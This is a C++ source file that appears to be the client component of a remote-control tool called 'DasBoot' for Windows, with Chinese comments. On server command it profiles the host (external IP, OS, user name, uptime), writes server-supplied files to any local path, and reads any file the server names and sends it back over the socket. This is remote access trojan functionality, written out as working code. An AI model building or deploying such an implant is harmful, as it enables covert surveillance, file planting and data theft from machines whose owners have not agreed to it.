#include "DasBootBasicRepl.h"
#include "BufPacket.h"
#include "DasBootSocket.h"
#include "DasBootClient.h"
#include <string>
#include <unordered_map>
#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>
#include <assert.h>


#define IP_STRING_LENGTH 16
#define USER_NAME_LENGTH 200
#define RUNNING_TIME_LENGTH 200
#define OS_INFO_LENGTH 256

//using namespace std;
#pragma comment(lib, "Advapi32.lib") //for GetUserName()
#pragma comment(lib, "wininet.lib")  //for InternetOpen()
#pragma comment(lib, "User32.lib")  //for GetOSDisplayString()

static int DBBRClientListInfoQueryR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
static int DBBRGiveClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
static int DBBRTransClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
static int DBBRCloseClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
static int DBBRGetClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);

static char** str_split(char* a_str, const char a_delim);
static int TransferFile(SOCKET hSocket, const char *szFileName, const char *szMsgType);



static DWORD GetExternalIPThreadFunc(LPVOID lpParam);
static BOOL GetOSDisplayString(LPTSTR pszOS);


extern std::unordered_map<std::string, pfnDBExportClient> g_mapFunctions;
extern SOCKET g_hSocketClient;
extern FILE *g_pCurrentFile;
extern int g_nFileChunckCount;



int SendMessageOut(SOCKET hSocket, const char * szType, const char * szContent, DWORD dwContentLength)
{
  CDasBootSocket sendSkt(hSocket);
  CBufPacket pkt;
  DWORD dwMsgContentLength = 0;

  if (dwContentLength == -1)
  {
    dwMsgContentLength = strlen(szContent) + 1;
  }
  else
  {
    dwMsgContentLength = dwContentLength;
  }

  char szHead[4] = { 0 };

  DWORD dwSize = sizeof(DWORD) + 16 + dwMsgContentLength;
  (DWORD&)*szHead = dwSize;
  pkt.Append(szHead, sizeof(szHead));
  pkt.Append((char *)szType, 16);
  pkt.Append((char *)szContent, dwMsgContentLength);

  sendSkt.SendPkt(pkt);

  return 0;
}



int AddBasicReplToMapFunctions()
{
  g_mapFunctions["ClientListInfoC"] = (pfnDBExportClient)DBBRClientListInfoQueryR;
  g_mapFunctions["GiveClientFileC"] = (pfnDBExportClient)DBBRGiveClientFileR;
  g_mapFunctions["TranClientFileC"] = (pfnDBExportClient)DBBRTransClientFileR;
  g_mapFunctions["ClosClientFileC"] = (pfnDBExportClient)DBBRCloseClientFileR;
  g_mapFunctions["GetClientFile0C"] = (pfnDBExportClient)DBBRGetClientFileR;


  return 0;
}


int DBBRClientListInfoQueryR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
{
  //获取主机的外部IP，进而server可以确定它的地理位置
  char szIPBuf[IP_STRING_LENGTH];
  HANDLE hGetExternalIPThread = CreateThread(NULL, 0,
    (LPTHREAD_START_ROUTINE)GetExternalIPThreadFunc, (LPVOID)szIPBuf, 0, NULL);

  //获取当前操作系统
  char szOSInfo[OS_INFO_LENGTH];
  GetOSDisplayString(szOSInfo);

  //获取当前用户名
  char szUserNameBuf[USER_NAME_LENGTH];
  DWORD size = USER_NAME_LENGTH;
  int i = GetUserName((LPSTR)szUserNameBuf, &size);

  //获取主机的运行时间
  DWORD time = GetTickCount();
  char szRunningTime[RUNNING_TIME_LENGTH];
  int n, hour, minute, second;

  n = time / 1000;
  second = n % 60;
  n = n / 60;
  minute = n % 60;
  hour = n / 60;

  sprintf(szRunningTime, "%d:%02d:%02d", hour, minute, second);

  //给10秒时间查外部IP，查不到的话（网络故障）直接给一个unkown-timeout
  DWORD nResult = WaitForSingleObject(hGetExternalIPThread, 10000); 
  if (nResult != WAIT_OBJECT_0)
  {
    TerminateThread(hGetExternalIPThread, 0);
    strcpy(szIPBuf, "unkown-timeout");
  }

  //总结
  char chSep = '\1';
  char szClientListInfoSum[IP_STRING_LENGTH + OS_INFO_LENGTH + USER_NAME_LENGTH
    + RUNNING_TIME_LENGTH];

  sprintf(szClientListInfoSum, "%s%c%s%c%s%c%s", szIPBuf, chSep, szOSInfo,
    chSep, szUserNameBuf, chSep, szRunningTime);

  SendMessageOut(g_hSocketClient, TEXT("ClientListInfoR"), szClientListInfoSum);

  return 0;
}

DWORD GetExternalIPThreadFunc(LPVOID lpParam)
{
  char *buffer = (char *)lpParam;

  HINTERNET net = InternetOpen("IP retriever",
    INTERNET_OPEN_TYPE_PRECONFIG,
    NULL,
    NULL,
    0);

  HINTERNET conn = InternetOpenUrl(net,
    "http://myexternalip.com/raw",  //"http://api.ipify.org", backup  
    NULL,
    0,
    INTERNET_FLAG_RELOAD,
    0);

  DWORD read;

  InternetReadFile(conn, buffer, IP_STRING_LENGTH, &read);
  buffer[read - 1] = '\0';
  InternetCloseHandle(net);

  return 0;
}



typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);

BOOL GetOSDisplayString(LPTSTR pszOS)
{
  OSVERSIONINFOEX osvi;
  SYSTEM_INFO si;
  PGNSI pGNSI;
  PGPI pGPI;
  BOOL bOsVersionInfoEx;
  DWORD dwType;

  ZeroMemory(&si, sizeof(SYSTEM_INFO));
  ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

  osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
  bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

  if (!bOsVersionInfoEx) return 1;

  // Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.

  pGNSI = (PGNSI)GetProcAddress(
    GetModuleHandle(TEXT("kernel32.dll")),
    "GetNativeSystemInfo");
  if (NULL != pGNSI)
    pGNSI(&si);
  else GetSystemInfo(&si);

  if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId &&
    osvi.dwMajorVersion > 4)
  {
    StringCchCopy(pszOS, OS_INFO_LENGTH, TEXT("Microsoft "));

    // Test for the specific product.

    if (osvi.dwMajorVersion == 6)
    {
      if (osvi.dwMinorVersion == 0)
      {
        if (osvi.wProductType == VER_NT_WORKSTATION)
          StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows Vista "));
        else StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows Server 2008 "));
      }

      if (osvi.dwMinorVersion == 1 || osvi.dwMinorVersion == 2)
      {
        if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 1)
          StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows 7 "));
        else
          if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 2)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows 8 "));
          else
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows Server 2008 R2 "));
      }

      pGPI = (PGPI)GetProcAddress(
        GetModuleHandle(TEXT("kernel32.dll")),
        "GetProductInfo");

      pGPI(osvi.dwMajorVersion, osvi.dwMinorVersion, 0, 0, &dwType);

      switch (dwType)
      {
      case PRODUCT_ULTIMATE:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Ultimate Edition"));
        break;
      case PRODUCT_PROFESSIONAL:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Professional"));
        break;
      case PRODUCT_HOME_PREMIUM:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Home Premium Edition"));
        break;
      case PRODUCT_HOME_BASIC:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Home Basic Edition"));
        break;
      case PRODUCT_ENTERPRISE:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Enterprise Edition"));
        break;
      case PRODUCT_BUSINESS:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Business Edition"));
        break;
      case PRODUCT_STARTER:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Starter Edition"));
        break;
      case PRODUCT_CLUSTER_SERVER:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Cluster Server Edition"));
        break;
      case PRODUCT_DATACENTER_SERVER:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Datacenter Edition"));
        break;
      case PRODUCT_DATACENTER_SERVER_CORE:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Datacenter Edition (core installation)"));
        break;
      case PRODUCT_ENTERPRISE_SERVER:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Enterprise Edition"));
        break;
      case PRODUCT_ENTERPRISE_SERVER_CORE:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Enterprise Edition (core installation)"));
        break;
      case PRODUCT_ENTERPRISE_SERVER_IA64:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Enterprise Edition for Itanium-based Systems"));
        break;
      case PRODUCT_SMALLBUSINESS_SERVER:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Small Business Server"));
        break;
      case PRODUCT_SMALLBUSINESS_SERVER_PREMIUM:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Small Business Server Premium Edition"));
        break;
      case PRODUCT_STANDARD_SERVER:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Standard Edition"));
        break;
      case PRODUCT_STANDARD_SERVER_CORE:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Standard Edition (core installation)"));
        break;
      case PRODUCT_WEB_SERVER:
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Web Server Edition"));
        break;
      }
    }

    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
    {
      if (GetSystemMetrics(SM_SERVERR2))
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows Server 2003 R2, "));
      else if (osvi.wSuiteMask & VER_SUITE_STORAGE_SERVER)
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows Storage Server 2003"));
      else if (osvi.wSuiteMask & VER_SUITE_WH_SERVER)
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows Home Server"));
      else if (osvi.wProductType == VER_NT_WORKSTATION &&
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
      {
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows XP Professional x64 Edition"));
      }
      else StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows Server 2003, "));

      // Test for the server type.
      if (osvi.wProductType != VER_NT_WORKSTATION)
      {
        if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
        {
          if (osvi.wSuiteMask & VER_SUITE_DATACENTER)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Datacenter Edition for Itanium-based Systems"));
          else if (osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Enterprise Edition for Itanium-based Systems"));
        }

        else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        {
          if (osvi.wSuiteMask & VER_SUITE_DATACENTER)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Datacenter x64 Edition"));
          else if (osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Enterprise x64 Edition"));
          else StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Standard x64 Edition"));
        }

        else
        {
          if (osvi.wSuiteMask & VER_SUITE_COMPUTE_SERVER)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Compute Cluster Edition"));
          else if (osvi.wSuiteMask & VER_SUITE_DATACENTER)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Datacenter Edition"));
          else if (osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Enterprise Edition"));
          else if (osvi.wSuiteMask & VER_SUITE_BLADE)
            StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Web Edition"));
          else StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Standard Edition"));
        }
      }
    }

    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
    {
      StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows XP "));
      if (osvi.wSuiteMask & VER_SUITE_PERSONAL)
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Home Edition"));
      else StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Professional"));
    }

    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
    {
      StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Windows 2000 "));

      if (osvi.wProductType == VER_NT_WORKSTATION)
      {
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Professional"));
      }
      else
      {
        if (osvi.wSuiteMask & VER_SUITE_DATACENTER)
          StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Datacenter Server"));
        else if (osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
          StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Advanced Server"));
        else StringCchCat(pszOS, OS_INFO_LENGTH, TEXT("Server"));
      }
    }

    // Include service pack (if any) and build number.

    if (_tcslen(osvi.szCSDVersion) > 0)
    {
      StringCchCat(pszOS, OS_INFO_LENGTH, TEXT(" "));
      StringCchCat(pszOS, OS_INFO_LENGTH, osvi.szCSDVersion);
    }

    TCHAR buf[80];

    StringCchPrintf(buf, 80, TEXT(" (build %d)"), osvi.dwBuildNumber);
    StringCchCat(pszOS, OS_INFO_LENGTH, buf);

    if (osvi.dwMajorVersion >= 6)
    {
      if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT(", 64-bit"));
      else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
        StringCchCat(pszOS, OS_INFO_LENGTH, TEXT(", 32-bit"));
    }

    return TRUE;
  }

  else
  {
    printf("This sample does not support this version of Windows.\n");
    return FALSE;
  }
}

int DBBRGiveClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
{
  char *pszClientFileInfo = new char[nMsgLength];
  char *pszServerFileInfo = new char[nMsgLength];

  char** tokens;
  tokens = str_split((char *)strParam, '\1');

  if (tokens)
  {
    for (int j = 0; *(tokens + j); j++)
    {
      //第一段信息是服务端的文件地址
      if (j == 0)
      {
        strcpy(pszServerFileInfo, *(tokens + j));
      }

      //第二段信息是客户端的文件地址
      if (j == 1)
      {
        strcpy(pszClientFileInfo, *(tokens + j));
      }
 
      free(*(tokens + j));
    }
    free(tokens);
  }//if (tokens)

  g_pCurrentFile = fopen(pszClientFileInfo, "ab");
  g_nFileChunckCount = 0;

  SendMessageOut(g_hSocketClient, TEXT("GiveClientFileR"), pszServerFileInfo);

  delete[] pszClientFileInfo;
  delete[] pszServerFileInfo;

  return 0;
}

int DBBRCloseClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
{
  fflush(g_pCurrentFile);
  fclose(g_pCurrentFile);
  g_nFileChunckCount = 0;

  SendMessageOut(g_hSocketClient, TEXT("ClosClientFileR"), strParam);

  return 0;
}

int DBBRGetClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
{
  TransferFile(g_hSocketClient, strParam, _T("GetClientFile0R"));

  return 0;
}

int DBBRTransClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
{
  char szCurrentCount[256];
  fwrite(strParam, 1, nMsgLength - 4 - 16, g_pCurrentFile);

  g_nFileChunckCount++;
  sprintf(szCurrentCount, "%d", g_nFileChunckCount);

  SendMessageOut(g_hSocketClient, TEXT("TranClientFileR"), szCurrentCount);

  return 0;
}

//https://stackoverflow.com/questions/9210528/split-string-with-delimiters-in-c
char** str_split(char* a_str, const char a_delim)
{
  char** result = 0;
  size_t count = 0;
  char* tmp = a_str;
  char* last_comma = 0;
  char delim[2];
  delim[0] = a_delim;
  delim[1] = 0;

  /* Count how many elements will be extracted. */
  while (*tmp)
  {
    if (a_delim == *tmp)
    {
      count++;
      last_comma = tmp;
    }
    tmp++;
  }

  /* Add space for trailing token. */
  count += last_comma < (a_str + strlen(a_str) - 1);

  /* Add space for terminating null string so caller
  knows where the list of returned strings ends. */
  count++;

  result = (char **)malloc(sizeof(char*) * count);

  if (result)
  {
    size_t idx = 0;
    char* token = strtok(a_str, delim);

    while (token)
    {
      assert(idx < count);
      *(result + idx++) = strdup(token);
      token = strtok(0, delim);
    }
    assert(idx == count - 1);
    *(result + idx) = 0;
  }

  return result;
}

//https://codereview.stackexchange.com/questions/43914/client-server-implementation-in-c-sending-data-files
int TransferFile(SOCKET hSocket, const char *szFileName, const char *szMsgType)
{
  FILE *pFile = fopen(szFileName, "rb");
  if (pFile == NULL)
  {
    //printf("File opern error");
    return 1;
  }

  while (1)
  {
    /* First read file in chunks of 256 bytes */
    unsigned char buff[1024] = { 0 };
    int nread = fread(buff, 1, 1024, pFile);
    //printf("Bytes read %d \n", nread);

    /* If read was success, send data. */
    if (nread > 0)
    {
      //printf("Sending \n");
      //write(connfd, buff, nread);

      SendMessageOut(hSocket, szMsgType, (const char *)buff, nread);
    }

    /*
    * There is something tricky going on with read ..
    * Either there was error, or we reached end of file.
    */
    if (nread < 1024)
    {
      if (feof(pFile))
      {
        //printf("End of file\n");

      }

      if (ferror(pFile))
      {
        //printf("Error reading\n");
      }

      break;
    }
  }//while (1)

  fclose(pFile);

  SendMessageOut(hSocket, _T("ClosServerFileN"), TEXT("nothing(current socket)"));

  return 0;
}